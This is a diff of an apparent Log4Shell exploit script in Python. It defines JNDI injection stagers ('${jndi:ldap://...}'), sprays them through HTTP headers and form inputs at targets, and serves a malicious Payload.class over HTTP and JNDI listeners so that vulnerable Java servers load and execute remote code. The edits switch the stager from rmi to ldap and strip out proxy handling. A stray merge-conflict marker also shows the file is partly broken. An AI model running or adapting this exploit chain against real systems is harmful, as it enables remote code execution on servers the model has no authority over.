@@ -32,7 +32,7 @@ TARGETS = [
 # NOTE: This is where you want to experiment with filter bypassing:
 
 STAGERS = [
-    '${{jndi:rmi://{rhost}/}}',  # NOTE: Double brackets escape for string formatting
+    '${{jndi:ldap://{rhost}/}}',  # NOTE: Double brackets escape for string formatting
     
 ]
 for port in JNDI_PORTS:
@@ -137,7 +137,6 @@ async def send_requests(scenario):
             response = await scenario.http_get(
                 target,
                 headers,
-                scenario.context['proxy']
             )
             if response:
                 input_fields = BeautifulSoup(response, 'html.parser').find_all('input')
@@ -147,7 +146,6 @@ async def send_requests(scenario):
                         target,
                         data,
                         headers,
-                        scenario.context['proxy']
                     )
 
 
@@ -156,10 +154,10 @@ if __name__ == "__main__":
     context = {
         'rhost': '127.0.0.1',
         'rport': 8889,
-        'proxy': '',
     }
 
     story = scenarios.Scenario(**context)
+    # story.set_proxy('http://127.0.0.1:8088')
 
     httpd = services.simple.http.HTTPStatic(story, address=context['rhost'], port=context['rport'])
     httpd.add_route('/', 'Welcome')
@@ -171,7 +169,7 @@ if __name__ == "__main__":
     httpd.add_route('/payload', open(os.path.join(os.path.dirname(__file__), 'Payload.class'), 'rb').read())
 >>>>>>> 39b0cc0 (Autorun)
 
-    story.debug()
+    story.set_debug()
     for port in JNDI_PORTS:
         JNDI(story, address=context['rhost'], port=port)
     story.add_scene(send_requests)
